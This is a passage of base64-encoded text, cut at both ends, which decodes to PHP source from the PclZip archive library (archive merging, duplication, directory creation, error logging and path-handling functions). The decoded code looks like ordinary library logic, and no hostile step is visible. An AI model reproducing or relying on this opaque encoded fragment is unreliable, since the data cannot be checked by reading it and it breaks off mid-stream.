QX09QVF9CWV9JTkRFWF1bJGpdWydlbmQnXSkpIHsNCiAgICAgICAgICAgICAgICAkdl9mb3VuZCA9IHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoJGk+PSRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF1bJGpdWydlbmQnXSkgew0KICAgICAgICAgICAgICAgICRqX3N0YXJ0ID0gJGorMTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgaWYgKCRwX29wdGlvbnNbUENMWklQX09QVF9CWV9JTkRFWF1bJGpdWydzdGFydCddPiRpKSB7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgZWxzZSB7DQogICAgCSR2X2ZvdW5kID0gdHJ1ZTsNCiAgICB9DQoNCiAgICBpZiAoJHZfZm91bmQpDQogICAgew0KICAgICAgdW5zZXQoJHZfaGVhZGVyX2xpc3RbJHZfbmJfZXh0cmFjdGVkXSk7DQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAkdl9uYl9leHRyYWN0ZWQrKzsNCiAgICB9DQogIH0NCg0KICBpZiAoJHZfbmJfZXh0cmFjdGVkID4gMCkgew0KDQogICAgICAkdl96aXBfdGVtcF9uYW1lID0gUENMWklQX1RFTVBPUkFSWV9ESVIudW5pcWlkKCdwY2x6aXAtJykuJy50bXAnOw0KDQogICAgICAkdl90ZW1wX3ppcCA9IG5ldyBQY2xaaXAoJHZfemlwX3RlbXBfbmFtZSk7DQoNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHZfdGVtcF96aXAtPnByaXZPcGVuRmQoJ3diJykpICE9IDEpIHsNCiAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQoNCiAgICAgIGZvciAoJGk9MDsgJGk8c2l6ZW9mKCR2X2hlYWRlcl9saXN0KTsgJGkrKykgew0KDQogICAgICAgICAgQHJld2luZCgkdGhpcy0+emlwX2ZkKTsNCiAgICAgICAgICBpZiAoQGZzZWVrKCR0aGlzLT56aXBfZmQsICAkdl9oZWFkZXJfbGlzdFskaV1bJ29mZnNldCddKSkgew0KICAgICAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgJHZfdGVtcF96aXAtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQoNCiAgICAgICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FSQ0hJVkVfWklQLCAnSW52YWxpZCBhcmNoaXZlIHNpemUnKTsNCg0KICAgICAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgICB9DQoNCiAgICAgICAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkRmlsZUhlYWRlcigkdl9sb2NhbF9oZWFkZXIpKSAhPSAxKSB7DQogICAgICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICAgICAkdl90ZW1wX3ppcC0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgQHVubGluaygkdl96aXBfdGVtcF9uYW1lKTsNCg0KICAgICAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICAgIH0NCiAgICAgICAgICANCiAgICAgICAgICBpZiAoJHRoaXMtPnByaXZDaGVja0ZpbGVIZWFkZXJzKCR2X2xvY2FsX2hlYWRlciwNCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdl9oZWFkZXJfbGlzdFskaV0pICE9IDEpIHsNCiAgICAgICAgICB9DQogICAgICAgICAgdW5zZXQoJHZfbG9jYWxfaGVhZGVyKTsNCg0KICAgICAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHZfdGVtcF96aXAtPnByaXZXcml0ZUZpbGVIZWFkZXIoJHZfaGVhZGVyX2xpc3RbJGldKSkgIT0gMSkgew0KICAgICAgICAgICAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICAgICAgICAgJHZfdGVtcF96aXAtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQoNCiAgICAgICAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgICAgICB9DQoNCiAgICAgICAgICBpZiAoKCR2X3Jlc3VsdCA9IFBjbFppcFV0aWxDb3B5QmxvY2soJHRoaXMtPnppcF9mZCwgJHZfdGVtcF96aXAtPnppcF9mZCwgJHZfaGVhZGVyX2xpc3RbJGldWydjb21wcmVzc2VkX3NpemUnXSkpICE9IDEpIHsNCiAgICAgICAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAgICR2X3RlbXBfemlwLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICAgICBAdW5saW5rKCR2X3ppcF90ZW1wX25hbWUpOw0KDQogICAgICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgICAgfQ0KICAgICAgfQ0KDQogICAgICAkdl9vZmZzZXQgPSBAZnRlbGwoJHZfdGVtcF96aXAtPnppcF9mZCk7DQoNCiAgICAgIGZvciAoJGk9MDsgJGk8c2l6ZW9mKCR2X2hlYWRlcl9saXN0KTsgJGkrKykgew0KICAgICAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHZfdGVtcF96aXAtPnByaXZXcml0ZUNlbnRyYWxGaWxlSGVhZGVyKCR2X2hlYWRlcl9saXN0WyRpXSkpICE9IDEpIHsNCiAgICAgICAgICAgICAgJHZfdGVtcF96aXAtPnByaXZDbG9zZUZkKCk7DQogICAgICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICAgICBAdW5saW5rKCR2X3ppcF90ZW1wX25hbWUpOw0KDQogICAgICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgICAgfQ0KDQogICAgICAgICAgJHZfdGVtcF96aXAtPnByaXZDb252ZXJ0SGVhZGVyMkZpbGVJbmZvKCR2X2hlYWRlcl9saXN0WyRpXSwgJHBfcmVzdWx0X2xpc3RbJGldKTsNCiAgICAgIH0NCg0KDQogICAgICAkdl9jb21tZW50ID0gJyc7DQogICAgICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0NPTU1FTlRdKSkgew0KICAgICAgICAkdl9jb21tZW50ID0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0NPTU1FTlRdOw0KICAgICAgfQ0KDQogICAgICAkdl9zaXplID0gQGZ0ZWxsKCR2X3RlbXBfemlwLT56aXBfZmQpLSR2X29mZnNldDsNCg0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdl90ZW1wX3ppcC0+cHJpdldyaXRlQ2VudHJhbEhlYWRlcihzaXplb2YoJHZfaGVhZGVyX2xpc3QpLCAkdl9zaXplLCAkdl9vZmZzZXQsICR2X2NvbW1lbnQpKSAhPSAxKSB7DQogICAgICAgICAgdW5zZXQoJHZfaGVhZGVyX2xpc3QpOw0KICAgICAgICAgICR2X3RlbXBfemlwLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICAgICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQoNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KDQogICAgICAkdl90ZW1wX3ppcC0+cHJpdkNsb3NlRmQoKTsNCiAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogICAgICBAdW5saW5rKCR0aGlzLT56aXBuYW1lKTsNCg0KICAgICAgUGNsWmlwVXRpbFJlbmFtZSgkdl96aXBfdGVtcF9uYW1lLCAkdGhpcy0+emlwbmFtZSk7DQogIA0KICAgICAgdW5zZXQoJHZfdGVtcF96aXApOw0KICB9DQogIA0KICBlbHNlIGlmICgkdl9jZW50cmFsX2RpclsnZW50cmllcyddICE9IDApIHsNCiAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogICAgICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2T3BlbkZkKCd3YicpKSAhPSAxKSB7DQogICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQoNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZXcml0ZUNlbnRyYWxIZWFkZXIoMCwgMCwgMCwgJycpKSAhPSAxKSB7DQogICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQoNCiAgICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkRpckNoZWNrKCRwX2RpciwgJHBfaXNfZGlyPWZhbHNlKQ0Kew0KICAkdl9yZXN1bHQgPSAxOw0KDQoNCiAgaWYgKCgkcF9pc19kaXIpICYmIChzdWJzdHIoJHBfZGlyLCAtMSk9PScvJykpDQogIHsNCiAgICAkcF9kaXIgPSBzdWJzdHIoJHBfZGlyLCAwLCBzdHJsZW4oJHBfZGlyKS0xKTsNCiAgfQ0KDQogIGlmICgoaXNfZGlyKCRwX2RpcikpIHx8ICgkcF9kaXIgPT0gIiIpKQ0KICB7DQogICAgcmV0dXJuIDE7DQogIH0NCg0KICAkcF9wYXJlbnRfZGlyID0gZGlybmFtZSgkcF9kaXIpOw0KDQogIGlmICgkcF9wYXJlbnRfZGlyICE9ICRwX2RpcikNCiAgew0KICAgIGlmICgkcF9wYXJlbnRfZGlyICE9ICIiKQ0KICAgIHsNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZEaXJDaGVjaygkcF9wYXJlbnRfZGlyKSkgIT0gMSkNCiAgICAgIHsNCiAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCiAgICB9DQogIH0NCg0KICBpZiAoIUBta2RpcigkcF9kaXIsIDA3NzcpKQ0KICB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9ESVJfQ1JFQVRFX0ZBSUwsICJVbmFibGUgdG8gY3JlYXRlIGRpcmVjdG9yeSAnJHBfZGlyJyIpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2TWVyZ2UoJiRwX2FyY2hpdmVfdG9fYWRkKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICBpZiAoIWlzX2ZpbGUoJHBfYXJjaGl2ZV90b19hZGQtPnppcG5hbWUpKQ0KICB7DQoNCiAgICAkdl9yZXN1bHQgPSAxOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIGlmICghaXNfZmlsZSgkdGhpcy0+emlwbmFtZSkpDQogIHsNCg0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RHVwbGljYXRlKCRwX2FyY2hpdmVfdG9fYWRkLT56aXBuYW1lKTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBpZiAoKCR2X3Jlc3VsdD0kdGhpcy0+cHJpdk9wZW5GZCgncmInKSkgIT0gMSkNCiAgew0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICAkdl9jZW50cmFsX2RpciA9IGFycmF5KCk7DQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkRW5kQ2VudHJhbERpcigkdl9jZW50cmFsX2RpcikpICE9IDEpDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgQHJld2luZCgkdGhpcy0+emlwX2ZkKTsNCg0KICBpZiAoKCR2X3Jlc3VsdD0kcF9hcmNoaXZlX3RvX2FkZC0+cHJpdk9wZW5GZCgncmInKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X2NlbnRyYWxfZGlyX3RvX2FkZCA9IGFycmF5KCk7DQogIGlmICgoJHZfcmVzdWx0ID0gJHBfYXJjaGl2ZV90b19hZGQtPnByaXZSZWFkRW5kQ2VudHJhbERpcigkdl9jZW50cmFsX2Rpcl90b19hZGQpKSAhPSAxKQ0KICB7DQogICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgJHBfYXJjaGl2ZV90b19hZGQtPnByaXZDbG9zZUZkKCk7DQoNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgQHJld2luZCgkcF9hcmNoaXZlX3RvX2FkZC0+emlwX2ZkKTsNCg0KICAkdl96aXBfdGVtcF9uYW1lID0gUENMWklQX1RFTVBPUkFSWV9ESVIudW5pcWlkKCdwY2x6aXAtJykuJy50bXAnOw0KDQogIGlmICgoJHZfemlwX3RlbXBfZmQgPSBAZm9wZW4oJHZfemlwX3RlbXBfbmFtZSwgJ3diJykpID09IDApDQogIHsNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCiAgICAkcF9hcmNoaXZlX3RvX2FkZC0+cHJpdkNsb3NlRmQoKTsNCg0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfemlwX3RlbXBfbmFtZS4nXCcgaW4gYmluYXJ5IHdyaXRlIG1vZGUnKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfc2l6ZSA9ICR2X2NlbnRyYWxfZGlyWydvZmZzZXQnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBmcmVhZCgkdGhpcy0+emlwX2ZkLCAkdl9yZWFkX3NpemUpOw0KICAgIEBmd3JpdGUoJHZfemlwX3RlbXBfZmQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogICR2X3NpemUgPSAkdl9jZW50cmFsX2Rpcl90b19hZGRbJ29mZnNldCddOw0KICB3aGlsZSAoJHZfc2l6ZSAhPSAwKQ0KICB7DQogICAgJHZfcmVhZF9zaXplID0gKCR2X3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHZfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICR2X2J1ZmZlciA9IGZyZWFkKCRwX2FyY2hpdmVfdG9fYWRkLT56aXBfZmQsICR2X3JlYWRfc2l6ZSk7DQogICAgQGZ3cml0ZSgkdl96aXBfdGVtcF9mZCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQoNCiAgJHZfb2Zmc2V0ID0gQGZ0ZWxsKCR2X3ppcF90ZW1wX2ZkKTsNCg0KICAkdl9zaXplID0gJHZfY2VudHJhbF9kaXJbJ3NpemUnXTsNCiAgd2hpbGUgKCR2X3NpemUgIT0gMCkNCiAgew0KICAgICR2X3JlYWRfc2l6ZSA9ICgkdl9zaXplIDwgUENMWklQX1JFQURfQkxPQ0tfU0laRSA/ICR2X3NpemUgOiBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFKTsNCiAgICAkdl9idWZmZXIgPSBAZnJlYWQoJHRoaXMtPnppcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR2X3ppcF90ZW1wX2ZkLCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgJHZfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogIH0NCg0KICAkdl9zaXplID0gJHZfY2VudHJhbF9kaXJfdG9fYWRkWydzaXplJ107DQogIHdoaWxlICgkdl9zaXplICE9IDApDQogIHsNCiAgICAkdl9yZWFkX3NpemUgPSAoJHZfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkdl9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgJHZfYnVmZmVyID0gQGZyZWFkKCRwX2FyY2hpdmVfdG9fYWRkLT56aXBfZmQsICR2X3JlYWRfc2l6ZSk7DQogICAgQGZ3cml0ZSgkdl96aXBfdGVtcF9mZCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQoNCiAgJHZfY29tbWVudCA9ICR2X2NlbnRyYWxfZGlyWydjb21tZW50J10uJyAnLiR2X2NlbnRyYWxfZGlyX3RvX2FkZFsnY29tbWVudCddOw0KDQogICR2X3NpemUgPSBAZnRlbGwoJHZfemlwX3RlbXBfZmQpLSR2X29mZnNldDsNCg0KICAkdl9zd2FwID0gJHRoaXMtPnppcF9mZDsNCiAgJHRoaXMtPnppcF9mZCA9ICR2X3ppcF90ZW1wX2ZkOw0KICAkdl96aXBfdGVtcF9mZCA9ICR2X3N3YXA7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlQ2VudHJhbEhlYWRlcigkdl9jZW50cmFsX2RpclsnZW50cmllcyddKyR2X2NlbnRyYWxfZGlyX3RvX2FkZFsnZW50cmllcyddLCAkdl9zaXplLCAkdl9vZmZzZXQsICR2X2NvbW1lbnQpKSAhPSAxKQ0KICB7DQogICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgJHBfYXJjaGl2ZV90b19hZGQtPnByaXZDbG9zZUZkKCk7DQogICAgQGZjbG9zZSgkdl96aXBfdGVtcF9mZCk7DQogICAgJHRoaXMtPnppcF9mZCA9IG51bGw7DQoNCiAgICB1bnNldCgkdl9oZWFkZXJfbGlzdCk7DQoNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfc3dhcCA9ICR0aGlzLT56aXBfZmQ7DQogICR0aGlzLT56aXBfZmQgPSAkdl96aXBfdGVtcF9mZDsNCiAgJHZfemlwX3RlbXBfZmQgPSAkdl9zd2FwOw0KDQogICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAkcF9hcmNoaXZlX3RvX2FkZC0+cHJpdkNsb3NlRmQoKTsNCg0KICBAZmNsb3NlKCR2X3ppcF90ZW1wX2ZkKTsNCg0KICBAdW5saW5rKCR0aGlzLT56aXBuYW1lKTsNCg0KICBQY2xaaXBVdGlsUmVuYW1lKCR2X3ppcF90ZW1wX25hbWUsICR0aGlzLT56aXBuYW1lKTsNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RHVwbGljYXRlKCRwX2FyY2hpdmVfZmlsZW5hbWUpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogIGlmICghaXNfZmlsZSgkcF9hcmNoaXZlX2ZpbGVuYW1lKSkNCiAgew0KDQogICAgJHZfcmVzdWx0ID0gMTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBpZiAoKCR2X3Jlc3VsdD0kdGhpcy0+cHJpdk9wZW5GZCgnd2InKSkgIT0gMSkNCiAgew0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBpZiAoKCR2X3ppcF90ZW1wX2ZkID0gQGZvcGVuKCRwX2FyY2hpdmVfZmlsZW5hbWUsICdyYicpKSA9PSAwKQ0KICB7DQogICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAnVW5hYmxlIHRvIG9wZW4gYXJjaGl2ZSBmaWxlIFwnJy4kcF9hcmNoaXZlX2ZpbGVuYW1lLidcJyBpbiBiaW5hcnkgd3JpdGUgbW9kZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9zaXplID0gZmlsZXNpemUoJHBfYXJjaGl2ZV9maWxlbmFtZSk7DQogIHdoaWxlICgkdl9zaXplICE9IDApDQogIHsNCiAgICAkdl9yZWFkX3NpemUgPSAoJHZfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkdl9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgJHZfYnVmZmVyID0gZnJlYWQoJHZfemlwX3RlbXBfZmQsICR2X3JlYWRfc2l6ZSk7DQogICAgQGZ3cml0ZSgkdGhpcy0+emlwX2ZkLCAkdl9idWZmZXIsICR2X3JlYWRfc2l6ZSk7DQogICAgJHZfc2l6ZSAtPSAkdl9yZWFkX3NpemU7DQogIH0NCg0KICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICBAZmNsb3NlKCR2X3ppcF90ZW1wX2ZkKTsNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2RXJyb3JMb2coJHBfZXJyb3JfY29kZT0wLCAkcF9lcnJvcl9zdHJpbmc9JycpDQp7DQogIGlmIChQQ0xaSVBfRVJST1JfRVhURVJOQUwgPT0gMSkgew0KICAgIFBjbEVycm9yKCRwX2Vycm9yX2NvZGUsICRwX2Vycm9yX3N0cmluZyk7DQogIH0NCiAgZWxzZSB7DQogICAgJHRoaXMtPmVycm9yX2NvZGUgPSAkcF9lcnJvcl9jb2RlOw0KICAgICR0aGlzLT5lcnJvcl9zdHJpbmcgPSAkcF9lcnJvcl9zdHJpbmc7DQogIH0NCn0NCg0KZnVuY3Rpb24gcHJpdkVycm9yUmVzZXQoKQ0Kew0KICBpZiAoUENMWklQX0VSUk9SX0VYVEVSTkFMID09IDEpIHsNCiAgICBQY2xFcnJvclJlc2V0KCk7DQogIH0NCiAgZWxzZSB7DQogICAgJHRoaXMtPmVycm9yX2NvZGUgPSAwOw0KICAgICR0aGlzLT5lcnJvcl9zdHJpbmcgPSAnJzsNCiAgfQ0KfQ0KDQpmdW5jdGlvbiBwcml2RGlzYWJsZU1hZ2ljUXVvdGVzKCkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgaWYgKCAgICghZnVuY3Rpb25fZXhpc3RzKCJnZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUiKSkNCiAgICB8fCAoIWZ1bmN0aW9uX2V4aXN0cygic2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lIikpKSB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KICBpZiAoJHRoaXMtPm1hZ2ljX3F1b3Rlc19zdGF0dXMgIT0gLTEpIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQokdGhpcy0+bWFnaWNfcXVvdGVzX3N0YXR1cyA9IEBnZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoKTsNCg0KaWYgKCR0aGlzLT5tYWdpY19xdW90ZXNfc3RhdHVzID09IDEpIHsNCiAgQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsNCn0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogIGlmICggICAoIWZ1bmN0aW9uX2V4aXN0cygiZ2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lIikpDQogICAgfHwgKCFmdW5jdGlvbl9leGlzdHMoInNldF9tYWdpY19xdW90ZXNfcnVudGltZSIpKSkgew0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCiAgaWYgKCR0aGlzLT5tYWdpY19xdW90ZXNfc3RhdHVzICE9IC0xKSB7DQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KaWYgKCR0aGlzLT5tYWdpY19xdW90ZXNfc3RhdHVzID09IDEpIHsNCgkgIEBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoJHRoaXMtPm1hZ2ljX3F1b3Rlc19zdGF0dXMpOw0KfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCn0NCg0KZnVuY3Rpb24gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHBfZGlyKQ0Kew0KICAkdl9yZXN1bHQgPSAiIjsNCg0KICBpZiAoJHBfZGlyICE9ICIiKSB7DQogICAgJHZfbGlzdCA9IGV4cGxvZGUoIi8iLCAkcF9kaXIpOw0KDQogICAgJHZfc2tpcCA9IDA7DQogICAgZm9yICgkaT1zaXplb2YoJHZfbGlzdCktMTsgJGk+PTA7ICRpLS0pIHsNCiAgICAgIGlmICgkdl9saXN0WyRpXSA9PSAiLiIpIHsNCiAgICAgIH0NCiAgICAgIGVsc2UgaWYgKCR2X2xpc3RbJGldID09ICIuLiIpIHsNCgkgICR2X3NraXArKzsNCiAgICAgIH0NCiAgICAgIGVsc2UgaWYgKCR2X2xpc3RbJGldID09ICIiKSB7DQoJICBpZiAoJGkgPT0gMCkgew0KICAgICAgICAgICR2X3Jlc3VsdCA9ICIvIi4kdl9yZXN1bHQ7DQoJICAgIGlmICgkdl9za2lwID4gMCkgew0KCSAgICAgICAgJHZfcmVzdWx0ID0gJHBfZGlyOw0KICAgICAgICAgICAgICAkdl9za2lwID0gMDsNCgkgICAgfQ0KCSAgfQ0KCSAgZWxzZSBpZiAoJGkgPT0gKHNpemVvZigkdl9saXN0KS0xKSkgew0KICAgICAgICAgICR2X3Jlc3VsdCA9ICR2X2xpc3RbJGldOw0KCSAgfQ0KCSAgZWxzZSB7DQoJICB9DQogICAgICB9DQogICAgICBlbHNlIHsNCgkgIGlmICgkdl9za2lwID4gMCkgew0KCSAgICAkdl9za2lwLS07DQoJICB9DQoJICBlbHNlIHsNCiAgICAgICAgICAkdl9yZXN1bHQgPSAkdl9saXN0WyRpXS4oJGkhPShzaXplb2YoJHZfbGlzdCktMSk/Ii8iLiR2X3Jlc3VsdDoiIik7DQoJICB9DQogICAgICB9DQogICAgfQ0KICAgIA0KICAgIGlmICgkdl9za2lwID4gMCkgew0KICAgICAgd2hpbGUgKCR2X3NraXAgPiAwKSB7DQogICAgICAgICAgJHZfcmVzdWx0ID0gJy4uLycuJHZfcmVzdWx0Ow0KICAgICAgICAgICR2X3NraXAtLTsNCiAgICAgIH0NCiAgICB9DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBQY2xaaXBVdGlsUGF0aEluY2x1c2lvbigkcF9kaXIsICRwX3BhdGgpDQp7DQogICR2X3Jlc3VsdCA9IDE7DQogIA0KICBpZiAoICAgKCRwX2RpciA9PSAnLicpDQogICAgICB8fCAoKHN0cmxlbigkcF9kaXIpID49MikgJiYgKHN1YnN0cigkcF9kaXIsIDAsIDIpID09ICcuLycpKSkgew0KICAgICRwX2RpciA9IFBjbFppcFV0aWxUcmFuc2xhdGVXaW5QYXRoKGdldGN3ZCgpLCBGQUxTRSkuJy8nLnN1YnN0cigkcF9kaXIsIDEpOw0KICB9DQogIGlmICggICAoJHBfcGF0aCA9PSAnLicpDQogICAgICB8fCAoKHN0cmxlbigkcF9wYXRoKSA+PTIpICYmIChzdWJzdHIoJHBfcGF0aCwgMCwgMikgPT0gJy4vJykpKSB7DQogICAgJHBfcGF0aCA9IFBjbFppcFV0aWxUcmFuc2xhdGVXaW5QYXRoKGdldGN3ZCgpLCBGQUxTRSkuJy8nLnN1YnN0cigkcF9wYXRoLCAxKTsNCiAgfQ0KDQogICR2X2xpc3RfZGlyID0gZXhwbG9kZSgiLyIsICRwX2Rpcik7DQogICR2X2xpc3RfZGlyX3NpemUgPSBzaXplb2YoJHZfbGlzdF9kaXIpOw0KICAkdl9saXN0X3BhdGggPSBleHBsb2RlKCIvIiwgJHBfcGF0aCk7DQogICR2X2xpc3RfcGF0aF9zaXplID0gc2l6ZW9mKCR2X2xpc3RfcGF0aCk7DQoNCiAgJGkgPSAwOw0KICAkaiA9IDA7DQogIHdoaWxlICgoJGkgPCAkdl9saXN0X2Rpcl9zaXplKSAmJiAoJGogPCAkdl9saXN0X3BhdGhfc2l6ZSkgJiYgKCR2X3Jlc3VsdCkpIHsNCg0KICAgIGlmICgkdl9saXN0X2RpclskaV0gPT0gJycpIHsNCiAgICAgICRpKys7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKCR2X2xpc3RfcGF0aFskal0gPT0gJycpIHsNCiAgICAgICRqKys7DQogICAgICBjb250aW51ZTsNCiAgICB9DQoNCiAgICBpZiAoKCR2X2xpc3RfZGlyWyRpXSAhPSAkdl9saXN0X3Bh